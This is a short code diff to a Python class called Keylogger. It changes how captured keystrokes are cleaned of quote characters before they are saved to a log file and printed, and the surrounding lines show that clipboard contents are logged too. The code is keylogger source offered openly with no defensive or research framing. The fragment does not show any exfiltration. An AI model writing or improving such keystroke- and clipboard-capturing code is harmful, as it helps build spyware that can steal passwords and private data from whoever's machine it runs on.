@@ -95,8 +95,9 @@ class Keylogger:
                     self.savefile(f'clipboard data: {data}\n')
 
                 # Log the Keystrokes
-                self.savefile(f'{key}\n')
-                print(f"Key pressed: {key}")  # Debug: Print the key pressed
+                key_str = str(key).replace("'", "")
+                self.savefile(f'{key_str}\n')
+                print(f"Key pressed: {key_str}")  # Debug: Print the key pressed
 
             except Exception as e:
                 print(f"Key press error: {e}")  # Debug: Print key press errors
